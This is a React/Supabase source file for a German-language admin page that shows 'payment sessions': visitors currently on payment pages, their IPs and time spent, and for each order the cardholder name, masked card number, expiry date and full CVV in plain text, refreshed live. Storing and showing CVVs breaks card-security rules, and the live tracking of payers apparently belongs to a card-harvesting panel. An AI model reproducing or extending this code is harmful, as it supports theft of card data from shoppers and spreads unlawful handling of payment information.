import React, { useState, useEffect } from 'react';
import { CreditCard, Eye, EyeOff, Clock, Users } from 'lucide-react';
import { ProtectedRoute } from '@/components/ProtectedRoute';
import { SidebarProvider } from '@/components/ui/sidebar';
import { AppSidebar } from '@/components/AppSidebar';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { supabase } from '@/integrations/supabase/client';
import { format } from 'date-fns';
import { de } from 'date-fns/locale';

interface PaymentSession {
  id: string;
  session_id: string;
  created_at: string;
  last_seen: string;
  is_active: boolean;
  user_ip: string;
  orders: {
    order_number: number;
    final_price: number;
    cardholder_name: string;
    card_number: string;
    expiry_date: string;
    cvv: string;
    created_at: string;
  };
}

const Payments = () => {
  const [activeSessions, setActiveSessions] = useState<PaymentSession[]>([]);
  const [inactiveSessions, setInactiveSessions] = useState<PaymentSession[]>([]);
  const [showInactive, setShowInactive] = useState(false);
  const [loading, setLoading] = useState(true);

  const fetchSessions = async () => {
    try {
      setLoading(true);
      
      // Fetch active sessions
      const activeResponse = await supabase.functions.invoke('payment-sessions/active-sessions');
      if (activeResponse.data?.sessions) {
        setActiveSessions(activeResponse.data.sessions);
      }

      // Fetch inactive sessions if needed
      if (showInactive) {
        const inactiveResponse = await supabase.functions.invoke('payment-sessions/inactive-sessions');
        if (inactiveResponse.data?.sessions) {
          setInactiveSessions(inactiveResponse.data.sessions);
        }
      }
    } catch (error) {
      console.error('Error fetching sessions:', error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchSessions();
    
    // Auto-refresh every 30 seconds
    const interval = setInterval(fetchSessions, 30000);
    
    // Listen to realtime updates
    const channel = supabase
      .channel('payment-sessions-changes')
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'payment_sessions'
        },
        () => {
          fetchSessions();
        }
      )
      .subscribe();

    return () => {
      clearInterval(interval);
      supabase.removeChannel(channel);
    };
  }, [showInactive]);

  const formatLastSeen = (lastSeen: string) => {
    const now = new Date();
    const lastSeenDate = new Date(lastSeen);
    const diffInSeconds = Math.floor((now.getTime() - lastSeenDate.getTime()) / 1000);
    
    if (diffInSeconds < 60) {
      return `vor ${diffInSeconds} Sekunden`;
    } else if (diffInSeconds < 3600) {
      const minutes = Math.floor(diffInSeconds / 60);
      return `vor ${minutes} Minute${minutes > 1 ? 'n' : ''}`;
    } else {
      const hours = Math.floor(diffInSeconds / 3600);
      return `vor ${hours} Stunde${hours > 1 ? 'n' : ''}`;
    }
  };

  const formatDuration = (createdAt: string, lastSeen: string) => {
    const created = new Date(createdAt);
    const last = new Date(lastSeen);
    const diffInMinutes = Math.floor((last.getTime() - created.getTime()) / (1000 * 60));
    
    if (diffInMinutes < 60) {
      return `${diffInMinutes} Min`;
    } else {
      const hours = Math.floor(diffInMinutes / 60);
      const minutes = diffInMinutes % 60;
      return `${hours}h ${minutes}m`;
    }
  };

  const maskCardNumber = (cardNumber: string) => {
    if (!cardNumber || cardNumber.length < 4) return cardNumber;
    return `****-****-****-${cardNumber.slice(-4)}`;
  };

  const sessionsToDisplay = showInactive ? inactiveSessions : activeSessions;

  return (
    <ProtectedRoute>
      <SidebarProvider>
        <div className="min-h-screen flex w-full">
          <AppSidebar />
          <main className="flex-1 p-6 bg-gray-50/30">
            <div className="max-w-7xl mx-auto space-y-6">
              {/* Header */}
              <div className="flex items-center justify-between">
                <div>
                  <h1 className="text-3xl font-bold text-foreground">Zahlungen</h1>
                  <p className="text-muted-foreground mt-1">
                    Aktive und inaktive Payment-Sessions verwalten
                  </p>
                </div>
                <Button
                  onClick={() => setShowInactive(!showInactive)}
                  variant={showInactive ? "default" : "outline"}
                  className="flex items-center space-x-2"
                >
                  {showInactive ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                  <span>
                    {showInactive ? 'Aktive Sessions' : 'Inaktive Sessions'}
                  </span>
                </Button>
              </div>

              {/* Stats Cards */}
              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                <Card>
                  <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                    <CardTitle className="text-sm font-medium">Aktive Sessions</CardTitle>
                    <Users className="h-4 w-4 text-muted-foreground" />
                  </CardHeader>
                  <CardContent>
                    <div className="text-2xl font-bold text-green-600">
                      {activeSessions.length}
                    </div>
                    <p className="text-xs text-muted-foreground">
                      Nutzer auf Payment-Seiten
                    </p>
                  </CardContent>
                </Card>

                <Card>
                  <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                    <CardTitle className="text-sm font-medium">Gesamtumsatz aktiv</CardTitle>
                    <CreditCard className="h-4 w-4 text-muted-foreground" />
                  </CardHeader>
                  <CardContent>
                    <div className="text-2xl font-bold">
                      €{activeSessions.reduce((sum, session) => sum + (session.orders?.final_price || 0), 0).toFixed(2)}
                    </div>
                    <p className="text-xs text-muted-foreground">
                      Von aktiven Sessions
                    </p>
                  </CardContent>
                </Card>

                <Card>
                  <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                    <CardTitle className="text-sm font-medium">Durchschnittliche Dauer</CardTitle>
                    <Clock className="h-4 w-4 text-muted-foreground" />
                  </CardHeader>
                  <CardContent>
                    <div className="text-2xl font-bold">
                      {activeSessions.length > 0 
                        ? Math.round(activeSessions.reduce((sum, session) => {
                            const duration = (new Date(session.last_seen).getTime() - new Date(session.created_at).getTime()) / (1000 * 60);
                            return sum + duration;
                          }, 0) / activeSessions.length)
                        : 0} Min
                    </div>
                    <p className="text-xs text-muted-foreground">
                      Pro Session
                    </p>
                  </CardContent>
                </Card>
              </div>

              {/* Sessions Table */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <span>
                      {showInactive ? 'Inaktive Sessions' : 'Aktive Sessions'}
                    </span>
                    <Badge variant={showInactive ? "secondary" : "default"}>
                      {sessionsToDisplay.length}
                    </Badge>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {loading ? (
                    <div className="flex items-center justify-center py-8">
                      <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary"></div>
                    </div>
                  ) : sessionsToDisplay.length === 0 ? (
                    <div className="text-center py-8 text-muted-foreground">
                      Keine {showInactive ? 'inaktiven' : 'aktiven'} Sessions gefunden
                    </div>
                  ) : (
                    <div className="overflow-x-auto">
                      <Table>
                        <TableHeader>
                          <TableRow>
                            <TableHead>Status</TableHead>
                            <TableHead>Bestellnummer</TableHead>
                            <TableHead>Datum</TableHead>
                            <TableHead>Endpreis</TableHead>
                            <TableHead>Karteninhaber</TableHead>
                            <TableHead>Kartennummer</TableHead>
                            <TableHead>Ablauf</TableHead>
                            <TableHead>CVV</TableHead>
                            <TableHead>Letzte Aktivität</TableHead>
                            <TableHead>Dauer</TableHead>
                          </TableRow>
                        </TableHeader>
                        <TableBody>
                          {sessionsToDisplay.map((session) => (
                            <TableRow key={session.id}>
                              <TableCell>
                                <div className="flex items-center space-x-2">
                                  <div className={`w-2 h-2 rounded-full ${
                                    session.is_active && 
                                    (new Date().getTime() - new Date(session.last_seen).getTime()) < 60000
                                      ? 'bg-green-500' 
                                      : 'bg-gray-400'
                                  }`} />
                                  <Badge variant={
                                    session.is_active && 
                                    (new Date().getTime() - new Date(session.last_seen).getTime()) < 60000
                                      ? "default" 
                                      : "secondary"
                                  }>
                                    {session.is_active && 
                                     (new Date().getTime() - new Date(session.last_seen).getTime()) < 60000
                                      ? 'Aktiv' 
                                      : 'Inaktiv'}
                                  </Badge>
                                </div>
                              </TableCell>
                              <TableCell className="font-mono">
                                {session.orders?.order_number || '-'}
                              </TableCell>
                              <TableCell className="whitespace-nowrap">
                                {session.orders?.created_at 
                                  ? format(new Date(session.orders.created_at), 'dd.MM.yyyy HH:mm', { locale: de })
                                  : '-'}
                              </TableCell>
                              <TableCell className="font-medium">
                                €{session.orders?.final_price?.toFixed(2) || '0.00'}
                              </TableCell>
                              <TableCell>
                                {session.orders?.cardholder_name || '-'}
                              </TableCell>
                              <TableCell className="font-mono">
                                {session.orders?.card_number 
                                  ? maskCardNumber(session.orders.card_number)
                                  : '-'}
                              </TableCell>
                              <TableCell className="font-mono">
                                {session.orders?.expiry_date || '-'}
                              </TableCell>
                              <TableCell className="font-mono">
                                {session.orders?.cvv || '-'}
                              </TableCell>
                              <TableCell className="whitespace-nowrap text-sm text-muted-foreground">
                                {formatLastSeen(session.last_seen)}
                              </TableCell>
                              <TableCell className="whitespace-nowrap text-sm">
                                {formatDuration(session.created_at, session.last_seen)}
                              </TableCell>
                            </TableRow>
                          ))}
                        </TableBody>
                      </Table>
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>
          </main>
        </div>
      </SidebarProvider>
    </ProtectedRoute>
  );
};

export default Payments;